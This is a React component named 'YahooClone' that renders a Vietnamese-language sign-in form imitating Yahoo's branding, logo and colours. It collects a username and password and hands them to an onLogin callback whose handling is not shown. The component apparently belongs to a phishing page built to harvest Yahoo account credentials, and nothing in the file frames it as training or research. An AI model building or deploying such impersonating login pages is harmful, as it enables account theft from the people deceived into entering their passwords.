import React, { useState } from 'react';
import { Loader, Eye, EyeOff } from 'lucide-react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const YahooClone = ({ onLogin, isLoading }) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (username && password) {
            onLogin({ username, password });
        }
    };

    return (
        <div
            className="w-full flex flex-col items-center justify-center p-4 sm:p-6"
        >
            <div className="w-full flex flex-col items-center text-center mb-8">
                <svg className="w-20 sm:w-24 mx-auto mb-4" fill="#6001d2" viewBox="0 0 24 24"><path d="M12.01 2.02c-5.51 0-9.99 4.48-9.99 9.99s4.48 9.99 9.99 9.99 9.99-4.48 9.99-9.99S17.52 2.02 12.01 2.02zm-.1 17.99c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-2.1-11.59l-1.4 4.19h1.4l.5-1.59h2.4l.5 1.59h1.4l-1.4-4.19h-3.5zm.4 2.79l.6-1.8h.1l.6 1.8h-1.3zm5.1-2.79h-1.4v4.19h1.4v-4.19zm2.8 0h-1.4v4.19h1.4v-4.19z"/></svg>
                <h1 className="text-xl sm:text-2xl font-bold mb-2">Đăng nhập</h1>
                <p className="text-sm sm:text-base text-gray-600">sử dụng tài khoản Yahoo của bạn</p>
            </div>
            <form onSubmit={handleSubmit} className="space-y-4 w-full max-w-sm">
                 <Input
                    type="text"
                    placeholder="Tên đăng nhập"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-purple-600 focus:border-purple-600 text-black placeholder-gray-500 bg-gray-50/80"
                />
                <div className="relative">
                    <Input
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Mật khẩu"
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-purple-600 focus:border-purple-600 text-black placeholder-gray-500 bg-gray-50/80 pr-10"
                    />
                     <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 hover:text-gray-700"
                        aria-label={showPassword ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
                    >
                        {showPassword ? <EyeOff /> : <Eye />}
                    </button>
                </div>
                <Button
                    type="submit"
                    className="w-full bg-[#5f01d1] hover:bg-[#4a01a3] text-white font-bold py-3 text-base sm:text-lg rounded-full"
                    disabled={isLoading}
                >
                     {isLoading ? <Loader className="animate-spin" /> : 'Tiếp theo'}
                </Button>
                <a href="#" className="text-xs sm:text-sm text-blue-600 hover:underline block pt-2 text-center">
                    Bạn không thể đăng nhập?
                </a>
            </form>
        </div>
    );
};

export default YahooClone;